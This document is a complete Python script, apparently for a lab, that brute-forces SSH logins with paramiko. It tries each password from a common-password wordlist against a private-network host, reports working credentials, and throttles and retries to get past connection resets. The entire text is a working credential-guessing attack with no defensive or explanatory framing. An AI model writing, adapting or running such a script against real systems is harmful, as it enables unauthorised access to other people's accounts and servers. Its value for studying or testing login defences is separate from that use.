import paramiko
import time

target_ip = "10.12.0.40"
username = "attacker"
wordlist_path = "10k-most-common.txt"

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

with open(wordlist_path, "r", encoding="latin-1") as f:
    for line in f:
        password = line.strip()
        try:
            print(f"[*] Trying {username}:{password}")
            ssh.connect(target_ip, port=22, username=username, password=password, timeout=5)
            print(f"[+] SUCCESS: {username}:{password}")
            ssh.close()
            break
        except paramiko.AuthenticationException:
            print(f"[-] Incorrect: {password}")
        except paramiko.ssh_exception.SSHException as e:
            print(f"[!] SSH Error (possible timeout or reset): {e}")
            time.sleep(5)  # Wait before retrying if the server drops connection
            continue
        except Exception as e:
            print(f"[!] Other error: {e}")
            break
        time.sleep(3)  # Prevent overwhelming the SSH server

